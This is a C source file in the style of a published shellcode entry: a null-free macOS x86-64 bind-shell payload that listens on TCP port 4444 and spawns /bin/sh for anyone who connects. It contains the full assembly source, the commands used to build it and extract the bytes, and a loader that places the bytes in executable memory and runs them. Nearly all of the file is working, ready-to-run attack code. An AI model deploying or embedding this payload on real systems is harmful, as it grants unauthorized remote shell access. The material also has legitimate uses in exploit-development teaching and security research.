/*
# Title:  macOS - Bind (4444/TCP) Shell (/bin/sh) + Null-Free Shellcode (123 bytes)
# Date:   2019-02-17
# Tested: macOS 10.14.1
# Author: Ken Kitahara
# Compilation: gcc -o loader loader.c

dev:works devuser$ sw_vers
ProductName:	Mac OS X
ProductVersion:	10.14.1
BuildVersion:	18B75
dev:works devuser$ cat ipv4bind.s
section .text
global start
start:
    ; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
    xor  rdi, rdi
    mul  rdi
    mov  dil, 0x2
    xor  rsi, rsi
    mov  sil, 0x1
    mov  al, 0x2
    ror  rax, 0x28
    mov  r8, rax
    mov  al, 0x61
    syscall

    ; struct sockaddr_in {
    ;         __uint8_t       sin_len;
    ;         sa_family_t     sin_family;
    ;         in_port_t       sin_port;
    ;         struct  in_addr sin_addr;
    ;         char            sin_zero[8];
    ; };
    mov  rsi, 0xffffffffa3eefdf0
    neg  rsi
    push rsi
    push rsp
    pop  rsi

    ; bind(host_sockid, &sockaddr, 16)
    mov  rdi, rax
    xor  dl, 0x10
    mov  rax, r8
    mov  al, 0x68
    syscall

    ; listen(host_sockid, 2)
    xor  rsi, rsi
    mov  sil, 0x2
    mov  rax, r8
    mov  al, 0x6a
    syscall

    ; accept(host_sockid, 0, 0)
    xor  rsi, rsi
    xor  rdx, rdx
    mov  rax, r8
    mov  al, 0x1e
    syscall

    mov rdi, rax
    mov sil, 0x3

dup2:
    ; dup2(client_sockid, 2)
    ;   -> dup2(client_sockid, 1)
    ;   -> dup2(client_sockid, 0)
    mov  rax, r8
    mov  al, 0x5a
    sub  sil, 1
    syscall
    test rsi, rsi
    jne  dup2

    ; execve("//bin/sh", 0, 0)
    push rsi
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    mov  rax, r8
    mov  al, 0x3b
    syscall
dev:works devuser$ nasm -f macho64 -o ipv4bind.o ipv4bind.s && ld -macosx_version_min 10.7.0 -o ipv4bind ipv4bind.o
dev:works devuser$ for i in $(objdump -d ./ipv4bind.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
\x48\x31\xff\x48\xf7\xe7\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\xb0\x02\x48\xc1\xc8\x28\x49\x89\xc0\xb0\x61\x0f\x05\x48\xc7\xc6\xf0\xfd\xee\xa3\x48\xf7\xde\x56\x54\x5e\x48\x89\xc7\x80\xf2\x10\x4c\x89\xc0\xb0\x68\x0f\x05\x48\x31\xf6\x40\xb6\x02\x4c\x89\xc0\xb0\x6a\x0f\x05\x48\x31\xf6\x48\x31\xd2\x4c\x89\xc0\xb0\x1e\x0f\x05\x48\x89\xc7\x40\xb6\x03\x4c\x89\xc0\xb0\x5a\x40\x80\xee\x01\x0f\x05\x48\x85\xf6\x75\xf0\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x4c\x89\xc0\xb0\x3b\x0f\x05
dev:works devuser$
*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] =
"\x48\x31\xff\x48\xf7\xe7\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\xb0\x02\x48\xc1\xc8\x28\x49\x89\xc0\xb0\x61\x0f\x05\x48\xc7\xc6\xf0\xfd\xee\xa3\x48\xf7\xde\x56\x54\x5e\x48\x89\xc7\x80\xf2\x10\x4c\x89\xc0\xb0\x68\x0f\x05\x48\x31\xf6\x40\xb6\x02\x4c\x89\xc0\xb0\x6a\x0f\x05\x48\x31\xf6\x48\x31\xd2\x4c\x89\xc0\xb0\x1e\x0f\x05\x48\x89\xc7\x40\xb6\x03\x4c\x89\xc0\xb0\x5a\x40\x80\xee\x01\x0f\x05\x48\x85\xf6\x75\xf0\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x4c\x89\xc0\xb0\x3b\x0f\x05";

int main(int argc, char **argv) {
    printf("Shellcode Length: %zd Bytes\n", strlen(shellcode));

    void *ptr = mmap(0, 0x22, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;

    sc();

    return 0;
}